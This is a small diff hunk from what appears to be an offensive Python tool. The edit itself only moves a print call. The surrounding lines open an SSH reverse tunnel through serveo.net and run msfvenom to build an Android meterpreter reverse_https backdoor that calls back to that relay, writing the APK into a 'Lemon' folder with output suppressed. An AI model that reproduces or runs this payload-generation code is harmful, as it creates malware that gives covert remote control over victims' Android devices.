@@ -61,9 +61,9 @@ check()
 print('\n[*] Forwarding HTTP port..\n')
 subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=accept-new", "-R", "80:localhost:4545", "serveo.net"])
 time.sleep(7)
+print('\n')
 
 def generate():
- print('\n')
  generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT={port} R> $HOME/Lemon/{name}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
 
 gen = threading.Thread(target=generate)
